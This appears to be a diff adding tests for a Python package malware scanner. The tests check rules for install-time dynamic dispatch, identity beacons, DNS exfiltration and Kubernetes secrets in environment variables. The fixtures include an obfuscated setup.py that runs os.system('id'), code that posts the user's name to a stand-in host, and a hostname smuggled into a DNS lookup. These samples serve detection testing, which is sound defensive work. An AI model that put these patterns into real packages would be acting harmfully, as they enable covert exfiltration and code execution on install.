+            "from setuptools import setup\nPAD = b'" + "A" * 300_000 + "'\nsetup(name='x')\n",
+            encoding="utf-8",
+        )
+        from cordon_scanner.core.limits import DEFAULT_LIMITS
+
+        config = Config.default().with_overrides(
+            use_cache=False, limits=DEFAULT_LIMITS.merged(max_file_bytes=100_000)
+        )
+        found = {(f.rule_id, f.severity.name) for f in Scanner(config).scan(tmp_path).findings}
+        assert ("SUSPECT.INSTALL.UNEXAMINED.001", "HIGH") in found
+
+    def test_a_large_ordinary_module_is_only_a_note(self, tmp_path) -> None:
+        from cordon_scanner import Scanner
+        from cordon_scanner.core.config import Config
+
+        (tmp_path / "data.py").write_text("PAD = b'" + "A" * 300_000 + "'\n", encoding="utf-8")
+        from cordon_scanner.core.limits import DEFAULT_LIMITS
+
+        config = Config.default().with_overrides(
+            use_cache=False, limits=DEFAULT_LIMITS.merged(max_file_bytes=100_000)
+        )
+        found = {f.rule_id for f in Scanner(config).scan(tmp_path).findings}
+        assert (
+            "OPERATIONAL.FILE.TRUNCATED" in found and "SUSPECT.INSTALL.UNEXAMINED.001" not in found
+        )
+
+
+class TestABeaconSendsTheIdentity:
+    def _beacon(self, tmp_path, source: str) -> list[str]:
+        return TestBeaconsOutsideAHook()._severity(tmp_path, source)
+
+    def test_a_socket_to_its_own_hostname_is_not_a_beacon(self, tmp_path) -> None:
+        source = "import socket\nhost = socket.gethostname()\ns = socket.socket()\ns.connect((host, 12345))\n"
+        assert self._beacon(tmp_path, source) == []
+
+    def test_a_hostname_read_near_an_unrelated_request_is_not(self, tmp_path) -> None:
+        source = "import socket, requests\nhost = socket.gethostname()\nrequests.get('https://api.example.com/status')\n"
+        assert self._beacon(tmp_path, source) == []
+
+    def test_the_identity_through_a_variable_is(self, tmp_path) -> None:
+        source = (
+            "import getpass, requests\nwho = getpass.getuser()\npayload = {'u': who}\n"
+            "requests.post('https://collect.invalid/', json=payload)\n"
+        )
+        assert self._beacon(tmp_path, source) == ["HIGH"]
+
+
+class TestInfrastructureInTestMaterial:
+    MANIFEST = (
+        "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: db\nspec:\n  template:\n    spec:\n"
+        "      containers:\n        - name: db\n          image: postgres:16\n          env:\n"
+        "            - name: POSTGRES_PASSWORD\n              value: hunter2hunter2\n"
+    )
+
+    def _severities(self, tmp_path, rel: str) -> set[str]:
+        from cordon_scanner import Scanner
+        from cordon_scanner.core.config import Config
+
+        path = tmp_path / rel
+        path.parent.mkdir(parents=True, exist_ok=True)
+        path.write_text(self.MANIFEST, encoding="utf-8")
+        return {
+            f.severity.name
+            for f in Scanner(Config.default().with_overrides(use_cache=False))
+            .scan(tmp_path)
+            .findings
+            if f.rule_id == "SUSPECT.K8S.SECRET_ENV_VALUE.001"
+        }
+
+    def test_a_deployed_manifest_blocks(self, tmp_path) -> None:
+        assert "HIGH" in self._severities(tmp_path, "deploy/db.yaml")
+
+    def test_a_test_fixture_is_below_the_gate(self, tmp_path) -> None:
+        assert self._severities(tmp_path, "util/helm/testdata/db.yaml") == {"MEDIUM"}
+
+
+class TestComputedNamesAtInstall:
+    def _rules(self, tmp_path, files: dict[str, str]) -> set[str]:
+        from cordon_scanner import Scanner
+        from cordon_scanner.core.config import Config
+
+        for name, text in files.items():
+            path = tmp_path / name
+            path.parent.mkdir(parents=True, exist_ok=True)
+            path.write_text(text, encoding="utf-8")
+        return {
+            f.rule_id
+            for f in Scanner(Config.default().with_overrides(use_cache=False))
+            .scan(tmp_path)
+            .findings
+        }
+
+    SETUP_IMPORTS = (
+        "from setuptools import setup\nimport lib\nsetup(name='p', version=lib.__version__)\n"
+    )
+
+    def test_in_the_setup_script_it_is_malware(self, tmp_path) -> None:
+        setup = "from setuptools import setup\nname = 'sys' + 'tem'\ngetattr(__import__('o' + 's'), name)('id')\nsetup(name='p')\n"
+        assert "MALWARE.DYNAMIC_DISPATCH.001" in self._rules(tmp_path, {"setup.py": setup})
+
+    def test_in_a_module_setup_imports_alone_it_is_not(self, tmp_path) -> None:
+        lib = "__version__ = '1.0'\ndef load(name):\n    return __import__(name)\nload(__name__)\n"
+        found = self._rules(tmp_path, {"setup.py": self.SETUP_IMPORTS, "lib.py": lib})
+        assert "MALWARE.DYNAMIC_DISPATCH.001" not in found
+
+    def test_in_a_module_beside_egress_it_is(self, tmp_path) -> None:
+        lib = (
+            "import sys, urllib.request\n__version__ = '1.0'\nmod = __import__(sys.argv[-1])\n"
+            "urllib.request.urlopen('https://h.invalid/x')\n"
+        )
+        found = self._rules(tmp_path, {"setup.py": self.SETUP_IMPORTS, "lib.py": lib})
+        assert "MALWARE.DYNAMIC_DISPATCH.001" in found
+
+
+class TestResolvingYourOwnHostname:
+    def test_own_hostname_lookup_is_neither_dns_exfiltration_nor_a_beacon(self, tmp_path) -> None:
+        source = "import socket\nhost = socket.gethostname()\nip = socket.gethostbyname(host)\nip2 = socket.gethostbyname(socket.gethostname())\n"
+        found = TestMoreDecodersAndDestinations()._rules(tmp_path, source)
+        assert not {r for r, _ in found} & {"SUSPECT.EXFIL.DNS.001", "SUSPECT.EXFIL.BEACON.001"}
+
+    def test_the_hostname_inside_another_domain_still_is(self, tmp_path) -> None:
+        source = "import socket\nh = socket.gethostname()\nsocket.gethostbyname(h + '.collect.example.net')\n"
+        found = TestMoreDecodersAndDestinations()._rules(tmp_path, source)
+        assert any(r == "SUSPECT.EXFIL.DNS.001" for r, _ in found)
